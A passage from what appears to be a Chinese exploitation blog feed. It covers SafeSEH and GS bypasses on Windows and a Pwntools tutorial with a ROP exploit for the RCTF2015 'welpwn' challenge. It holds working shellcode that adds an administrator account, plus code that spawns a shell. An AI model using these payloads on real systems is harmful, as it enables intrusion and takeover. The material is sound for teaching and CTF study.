0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7\xe9\x39\xff\xff\xff\x90\x90\x90\xeb\xf6\x90\x90\x31\x12\x40&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们把返回地址覆盖为\x90\x90\x90\x90了，而这这地址不可执行，程序抛出异常。在pop pop retn指令地址下断点</p><p><img src="/.io//image-20240213003830775.png" alt="image-20240213003830775"></p><p>00401231  . 59       POP ECX</p><p>   然后Shift+F9把异常交给SEH 处理。程序会断在0x00401231处。</p><p>   00401233  . C3       RETN</p><p>   此时的esp为0x0018f328</p><p><img src="/.io//image-20240213003952420.png" alt="image-20240213003952420"></p><p> 也就说是接下来程序会到0x0018ff78执行。我们按下F8</p><p><img src="/.io//image-20240213004026045.png" alt="image-20240213004026045"></p><p>这个就是nseh处的跳转指令，它又跳到nseh前八个字节处【注意当前指令地址0x0018ff78和jmp的目标地址0x0018ff70】继续F8。</p><p><img src="/.io//image-20240213004055170.png" alt="image-20240213004055170"></p><p>又是一个跳转，这回跳到我们的shellcode，f8</p><p><img src="/.io//image-20240213004204445.png" alt="image-20240213004204445"></p><p>放行程序，成功。</p><p><img src="/.io//image-20240213004322862.png" alt="image-20240213004322862"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;突破safeSeh&quot;&gt;&lt;a href=&quot;#突破safeSeh&quot; class=&quot;headerlink&quot; title=&quot;突破safeSeh&quot;&gt;&lt;/a&gt;突破safeSeh&lt;/h1&gt;&lt;p&gt;设计SafeSEH保护机制的目的，以为了防止那种攻击者通过覆盖堆栈上的异常处理函数句</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>突破GS</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4GS/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4GS/</id>
    <published>2024-03-09T12:36:32.000Z</published>
    <updated>2024-03-09T12:36:47.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="突破GS"><a href="#突破GS" class="headerlink" title="突破GS"></a>突破GS</h1><p>针对缓冲区溢出覆盖函数返回地址这一特征，微软在编译程序时候使用了一个很酷的安全编译选项—GS。&#x2F;GS 编译选项会在函数的开头和结尾添加代码来阻止对典型的栈溢出漏洞（字符串缓冲区）的利用。当应用程序启动时，程序的 cookie（4 字节（dword），无符号整型）被计算出来（伪随机数）并保存在 加载模块的.data 节中,在函数的开头这个 cookie 被拷贝到栈中，位于 EBP 和返回地址的正前方（位于返回地址和局部变量的中间）。</p><p>   [局部变量 ] [cookie] [保存的EBP] [保存的返回地址] [参数]</p><p>   在函数的结尾处，程序会把这个 cookie 和保存在.data 节中的 cookie 进行比较。 如果不相等，就说明进程栈被破坏，进程必须被终止。</p><p><img src="/.io//image-20240213211728720.png" alt="image-20240213211728720"></p><p>为了演示覆盖虚表指针这种技术，将使用下面的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestClass</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> __declspec(noinline) <span class="built_in">test1</span>(<span class="type">char</span>* src)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcpy</span>(buf, src);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">test2</span>();   <span class="comment">//调用虚函数test2</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">virtual</span> <span class="type">void</span> __declspec(noinline) <span class="built_in">test2</span>()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str[<span class="number">8000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LoadLibrary</span>(_T(<span class="string">&quot;Netfairy.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">    TestClass test;</span><br><span class="line"></span><br><span class="line">    test.<span class="built_in">test1</span>(<span class="string">&quot;AAAABBBBCCCCDDD&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestClass对象在 main 函数的堆栈中分配空间，并在 main 函数中被调用，然后对象test被做为参数传递给存在 漏洞的成员函数 test1（如果把大于 8 字节的字符串拷贝到 buf，buf 就会被溢出。）。 完成拷贝后，一个虚函数会被执行，因为前边的溢出，堆栈中指向虚函数表的指针可能已经被覆盖，这样 就可以把程序的执行流重定向到 shellcode 中。</p><p> 用Olldbg载入程序，查看test1函数的代码</p><p><img src="/.io//image-20240213212349339.png" alt="image-20240213212349339"></p><p> test1函数是受到GS保护的函数，在</p><p>   <strong>00401006 A1 18304000  mov   eax, dword ptr ds:[test.__security_cookie]</strong></p><p>   <strong>0040100B   33C5     xor   eax, ebp</strong></p><p>   <strong>0040100D   8945 FC    mov   dword ptr ss:[ebp-4], eax</strong></p><p>   设置安全cookie。在</p><p>   <strong>0040105E   E8 54000000  call  test.__security_check_cookie</strong></p><p>进行检验，如果栈中的cookie被覆盖，那么程序将直接退出。但是我们注意到，在调用校验函数的时候，test1函数先调用了test2函数</p><p> <strong>00401057  FFD0  call  eax      ; test.TestClass::test2</strong></p><p><img src="/.io//image-20240213212456073.png" alt="image-20240213212456073"></p><p>而test2是虚函数，所以我们可以覆盖保存在栈中的虚表指针，间接跳到我们的shellcode。我们先执行到</p><p>   **00401050   8B10     mov   edx, dword ptr ds:[eax]**观察此时的eax为0x0018FF40，这个地址保存着虚表指针。</p><p><img src="/.io//image-20240213212735125.png" alt="image-20240213212735125"></p><p>再执行到 <strong>00401057 FFD0  call  eax    ;test.TestClass::test2</strong></p><p><img src="/.io//image-20240213212900377.png" alt="image-20240213212900377"></p><p>当输入“AAAABBBBCCCCDDD”时，刚刚开始覆盖到返回地址。如果我们输入很多字符的时候，多到恰好能覆盖虚表指针那么我们就能控制程序。我们可以计算出多少字符能够覆盖到虚表指针</p><p>X&#x3D;0x0018ff40-0x0018dfe4&#x3D;0x1f60，十进制就是8028。我们可以试一下，把test.test1(“AAAABBBBCCCCDDD”);中的AAAABBBBCCCCDDD改为8028个A。重新编译，用OD调试，执行到</p><p>   <strong>00401057   FFD0     call  eax</strong></p><p><img src="/.io//image-20240213213531916.png" alt="image-20240213213531916"></p><p> 可以看到8028个A刚好能覆盖到虚表指针。接下来就是构造利用了。找一个地址，这个地址保存的值指向我们的A。我们最好在没有开启ASLR的模块找，Netfairy.dll就是一个不错的选择。很快，我用Olldbg的搜索功能找到了一个</p><p><img src="/.io//image-20240213213630519.png" alt="image-20240213213630519"></p><p>0x500295A2保存的0x0018E1E8指向我们的AAAAAA…。下来我们把虚表指针覆盖为0x500295A2，把8028个A替换为我们的shellcode，不足的用\x90补充。务必记住，把shellcode放在0x0018E1E8之后，否则利用失败。</p><p>尽管堆栈中的 cookie 被破坏了，但我们依然劫持了 E I P（因为我们溢出了虚函数表指针，并控制了 eax），从而控制了程序的流程，执行了我们的shellcode。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;突破GS&quot;&gt;&lt;a href=&quot;#突破GS&quot; class=&quot;headerlink&quot; title=&quot;突破GS&quot;&gt;&lt;/a&gt;突破GS&lt;/h1&gt;&lt;p&gt;针对缓冲区溢出覆盖函数返回地址这一特征，微软在编译程序时候使用了一个很酷的安全编译选项—GS。&amp;#x2F;GS 编译选项会在</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Pwntools</title>
    <link href="https://qianmuoy.github.io/2024/03/09/Pwntools/"/>
    <id>https://qianmuoy.github.io/2024/03/09/Pwntools/</id>
    <published>2024-03-09T12:35:54.000Z</published>
    <updated>2024-03-09T12:36:06.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于pwntools编写pwn代码"><a href="#基于pwntools编写pwn代码" class="headerlink" title="基于pwntools编写pwn代码"></a>基于pwntools编写pwn代码</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。</p><p><strong>1.Pwntools安装及模块（已装）</strong></p><p>1）安装</p><p>安装命令：pip install –upgrade pwntools</p><p>安装完毕后在python环境下只需使用 from pwn import * 即可导入</p><p>这会将大量的功能导入到全局命名空间，然后我们就可以直接使用单一的函数进行汇编、反汇编、pack,unpack等操作。</p><p>2）常用模块如下</p><p>asm：汇编与反汇编，支持x86&#x2F;x64&#x2F;arm&#x2F;mips&#x2F;powerpc等基本上所有的主流平台</p><p>dynelf：用于远程符号泄漏，需要提供leak方法</p><p>elf：对elf文件进行操作</p><p>gdb：配合gdb进行调试</p><p>memleak：用于内存泄漏</p><p>shellcraft：shellcode的生成器</p><p>tubes：包括tubes.sock,tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</p><p>utils：一些实用的小功能，例如CRC计算，cyclic pattern等</p><p><strong>2.常用模块详细介绍</strong></p><p><strong>1）Tubes读写接口</strong></p><p>这是exploit最为基础的部分，对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote（address, port）产生一个远程的socket然后就可以读写了。</p><p>先来看看pwntools建立连接的功能，在kali上开启ftp服务：</p><p>service vsftpd start</p><p><img src="/.io//image-20240210144725321.png" alt="image-20240210144725321"></p><p>这里是模拟了使用anonymous用户登录ftp服务的场景</p><p>pwntools还有创建监听器的功能，如下所示</p><p><img src="/.io//image-20240210144749507.png" alt="image-20240210144749507"></p><p>上图中是自动监听41375端口，然后模仿发送hello消息，然后使用recv()进行接收。</p><p>通过pwnlib.tubes.process可以与进程进行交互</p><p><img src="/.io//image-20240210144849721.png" alt="image-20240210144849721"></p><p>上图中是与&#x2F;bin&#x2F;sh进行交互，打印hello world</p><p>我们不单单可以通过编程的方式事先写好与进程交互的逻辑，还可以直接与进程交互</p><p><img src="/.io//image-20240210144917152.png" alt="image-20240210144917152"></p><p>上图中通过interactive()进入了交互模式</p><p>无论哪种PIPE都是继承tube而来，可以用于读写函数主要有:</p><p>interactive()：直接进行交互，相当于回到shell的模式，在取得shell之后使用</p><p>recv(numb&#x3D;4096, timeout&#x3D;default)：接收指定字节</p><p>recvall()：一直接收直到EOF</p><p>recvline(keepends&#x3D;True)：接收一行，keepends为是否保留行尾的\n</p><p>recvuntil(delims, drop&#x3D;False)：一直读到delims的pattern出现为止</p><p>recvrepeat(timeout&#x3D;default)：持续接受直到EOF或timeout</p><p>send(data)：发送数据</p><p>sendline(data)：发送一行数据，相当于在数据末尾加\n</p><p><strong>2）汇编与反汇编</strong></p><p>使用asm进行汇编</p><p><img src="/.io//image-20240210144958929.png" alt="image-20240210144958929"></p><p>使用disasm进行反汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> disasm(<span class="string">&#x27;6a0258cd80ebf9&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210145024530.png" alt="image-20240210145024530"></p><p><strong>3）shellcode生成器</strong></p><p>使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210145241417.png" alt="image-20240210145241417"></p><p>如上所示，如果需要在64位的Linux上执行&#x2F;bin&#x2F;sh就可以使用shellcraft.amd64.linux.sh()，配合asm函数就能够得到最终的pyaload了。</p><p>除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。</p><p><strong>4）elf文件操作</strong></p><p>在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置</p><p>下图分别是打印文件装载的基地址、函数地址、GOT表的地址、PLT表的地址</p><p><img src="/.io//image-20240210145319039.png" alt="image-20240210145319039"></p><p>其他可用的函数还包括：</p><p>asm(address, assembly)：在指定地址进行汇编</p><p>bss(offset)：返回bss段的位置，offset是偏移值</p><p>checksec()：对elf进行一些安全保护检查，例如NX,PIE等。</p><p>disasm(address, n_bytes)：在指定位置进行n_bytes个字节的反汇编</p><p>offset_to_vaddr(offset)：将文件中的偏移offset转换成虚拟地址VMA</p><p>vaddr_to_offset(address)：与上面的函数作用相反</p><p>read(address, count)：在address(VMA)位置读取count个字节</p><p>write(address, data)：在address(VMA)位置写入data</p><p>section(name)：dump出指定section的数据</p><p><strong>5）ROP链生成器</strong></p><p>回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop&#x2F;ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上&#x2F;bin&#x2F;sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘&#x2F;bin&#x2F;sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。</p><p>这种技术的难点自然就是如何在栈上布置返回地址以及函数参数。而pwntools的ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p><p>使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数</p><p><img src="/.io//image-20240210145421362.png" alt="image-20240210145421362"></p><p>ROP对象实现了__getattr__的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。</p><p><img src="/.io//image-20240210145440379.png" alt="image-20240210145440379"></p><p>其他常用函数包括：</p><p>call(resolvable, arguments&#x3D;())：添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</p><p>chain()：返回当前的字节序列，即payload</p><p>dump()：直观地展示出当前的ropchain</p><p>raw()：在rop chain中加上一个整数或字符串</p><p>search(move&#x3D;0, regs&#x3D;None, order&#x3D;’size’)：按特定条件搜索gadget，没仔细研究过</p><p>unresolve(value)：给出一个地址，反解析出符号</p><p>另外，对于整数的pack与数据的unpack，可以使用p32,p64,u32,u64这些函数，分别对应着32位和64位的整数</p><h2 id="使用pwntools实战CTF题目"><a href="#使用pwntools实战CTF题目" class="headerlink" title="使用pwntools实战CTF题目"></a><strong>使用pwntools实战CTF题目</strong></h2><p>题目来自RCTF2015,名为welpwn</p><p>先看看程序的基本信息</p><p><img src="/.io//image-20240210145925577.png" alt="image-20240210145925577"></p><p>可以知道，这是64位linux下的二进制程序，无cookie</p><p>通过IDA静态分析</p><p><img src="/.io//image-20240210150053429.png" alt="image-20240210150053429"></p><p>main函数</p><p><img src="/.io//image-20240210150109984.png" alt="image-20240210150109984"></p><p><img src="/.io//image-20240210150116727.png" alt="image-20240210150116727"></p><p>read()函数读取字节数为0x400,即十进制的1024，即read()读取1024个字节的数据，随后调用echo()</p><p>定位到echo()</p><p><img src="/.io//image-20240210150140123.png" alt="image-20240210150140123"></p><p>可以看到echo函数的栈帧大小为20h</p><p>echo的伪码</p><p><img src="/.io//image-20240210150152033.png" alt="image-20240210150152033"></p><p>可以知道，echo函数中存在循环赋值，循环的次数为read函数读的数据的长度</p><p>由于echo函数的栈桢大小（20h）远小于read函数可以读取的数据长度(400h)，在进行循环赋值的时候，echo函数保存在栈中的返回地址会被覆盖。</p><p>整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为welpwn的NX为enabled,即设置了栈不可执行，所以我们需要构造ROP链，这样肯定会在payload中包含“x00”字符。</p><p>那么怎么绕过这个障碍呢？</p><p>由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节（0x20h），故我们可以只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址(8字节)，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程。</p><p>绕过这个障碍后，解题思路就很清晰了：</p><p>-泄露libc，获取system,gets等函数地址</p><p>-构造gets(bss);将’&#x2F;bin&#x2F;sh’写入bss段</p><p>-构造’system(“&#x2F;bin&#x2F;sh”)’得到shell</p><p>使用ROPgadgets寻找gadgets，用于构造ROP链条</p><p>ROPgadget –binary .&#x2F;welpwn –only “opo|ret”</p><p><img src="/.io//image-20240210150355752.png" alt="image-20240210150355752"></p><p>找到main函数地址，用作返回地址</p><p>objdump -d welpwn | grep main</p><p><img src="/.io//image-20240210150427028.png" alt="image-20240210150427028"></p><p>bss段开始地址，用于存储字符串(‘&#x2F;bin&#x2F;sh’)</p><p>readelf -S welpwn | grep bss</p><p><img src="/.io//image-20240210150505608.png" alt="image-20240210150505608"></p><p>puts（plt）地址，用于泄露内存</p><p>objdump -d welpwn | grep puts</p><p><img src="/.io//image-20240210150544260.png" alt="image-20240210150544260"></p><p>构造ROP链，泄露内存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(addr) +p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure><p>利用pwnlib中DynELF模块泄露libc中system和puts地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line"></span><br><span class="line">rop = p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span> + p64(ppppr) + rop</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">27</span>)</span><br><span class="line"></span><br><span class="line">tmp = p.recv()</span><br><span class="line"></span><br><span class="line">data = tmp.split(<span class="string">&quot;\nWelcome&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(data):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;welpwn&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets = d.lookup(<span class="string">&#x27;gets&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>构造ROP链将’&#x2F;bin&#x2F;sh’写入bss段，并执行system(“&#x2F;bin&#x2F;sh”):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = p64(poprdi) + p64(bss) + p64(gets) +p64(poprdi) + p64(bss) + p64(system) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">24</span> + p64(ppppr) +rop</span><br></pre></td></tr></table></figure><p>运行后如图所示，拿到shell</p><p><img src="/.io//image-20240210150719044.png" alt="image-20240210150719044"></p><p><img src="/.io//image-20240210150728857.png" alt="image-20240210150728857"></p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 